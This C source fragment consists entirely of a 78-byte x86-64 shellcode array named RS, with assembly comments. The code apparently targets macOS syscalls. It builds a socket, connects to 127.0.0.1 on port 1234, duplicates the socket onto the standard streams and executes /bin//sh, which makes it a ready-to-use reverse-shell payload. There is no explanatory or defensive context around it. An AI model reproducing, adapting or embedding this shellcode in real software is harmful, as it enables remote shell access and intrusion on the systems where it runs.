
#define RS_SIZE 78

char RS[] = {
  /* 0000 */ "\x48\xb9\xff\xfd\xfb\x2d\x80\xff\xff\xfe" /* mov rcx, 0xfeffff802dfbfdff */
  /* 000A */ "\x48\xf7\xd1"                             /* not rcx                     */
  /* 000D */ "\x51"                                     /* push rcx                    */
  /* 000E */ "\x31\xed"                                 /* xor ebp, ebp                */
  /* 0010 */ "\x0f\xba\xed\x19"                         /* bts ebp, 0x19               */
  /* 0014 */ "\x55"                                     /* push rbp                    */
  /* 0015 */ "\x58"                                     /* pop rax                     */
  /* 0016 */ "\x99"                                     /* cdq                         */
  /* 0017 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0019 */ "\x5e"                                     /* pop rsi                     */
  /* 001A */ "\x6a\x02"                                 /* push 0x2                    */
  /* 001C */ "\x5f"                                     /* pop rdi                     */
  /* 001D */ "\xb0\x61"                                 /* mov al, 0x61                */
  /* 001F */ "\x0f\x05"                                 /* syscall                     */
  /* 0021 */ "\x97"                                     /* xchg edi, eax               */
  /* 0022 */ "\x96"                                     /* xchg esi, eax               */
  /* 0023 */ "\x55"                                     /* push rbp                    */
  /* 0024 */ "\x58"                                     /* pop rax                     */
  /* 0025 */ "\xb0\x5a"                                 /* mov al, 0x5a                */
  /* 0027 */ "\x0f\x05"                                 /* syscall                     */
  /* 0029 */ "\xff\xce"                                 /* dec esi                     */
  /* 002B */ "\x79\xf6"                                 /* jns 0x23                    */
  /* 002D */ "\x55"                                     /* push rbp                    */
  /* 002E */ "\x58"                                     /* pop rax                     */
  /* 002F */ "\x54"                                     /* push rsp                    */
  /* 0030 */ "\x5e"                                     /* pop rsi                     */
  /* 0031 */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0033 */ "\xb0\x62"                                 /* mov al, 0x62                */
  /* 0035 */ "\x0f\x05"                                 /* syscall                     */
  /* 0037 */ "\x50"                                     /* push rax                    */
  /* 0038 */ "\x5e"                                     /* pop rsi                     */
  /* 0039 */ "\x55"                                     /* push rbp                    */
  /* 003A */ "\x58"                                     /* pop rax                     */
  /* 003B */ "\x99"                                     /* cdq                         */
  /* 003C */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rbx, 0x68732f2f6e69622f */
  /* 0046 */ "\x52"                                     /* push rdx                    */
  /* 0047 */ "\x53"                                     /* push rbx                    */
  /* 0048 */ "\x54"                                     /* push rsp                    */
  /* 0049 */ "\x5f"                                     /* pop rdi                     */
  /* 004A */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 004C */ "\x0f\x05"                                 /* syscall                     */
};